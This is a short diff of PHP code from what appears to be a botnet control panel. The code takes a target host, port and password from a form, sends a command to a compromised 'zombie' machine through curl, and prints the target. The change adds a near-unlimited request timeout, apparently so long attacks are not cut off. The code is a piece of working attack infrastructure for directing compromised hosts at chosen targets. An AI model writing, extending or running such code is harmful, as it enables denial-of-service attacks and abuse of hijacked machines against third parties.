@@ -93,6 +93,7 @@ elseif(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['pass']) &
         curl_setopt($c, CURLOPT_POSTFIELDS, $data);
         curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($c, CURLOPT_HEADER, true);
+        curl_setopt($c, CURLOPT_TIMEOUT, 9999999999);
         $res = curl_exec($c);
         curl_close($c);
         echo "Command Sent to $zombie <br/>Target is: <br/>$type$host:$port<br/>$res<hr>";
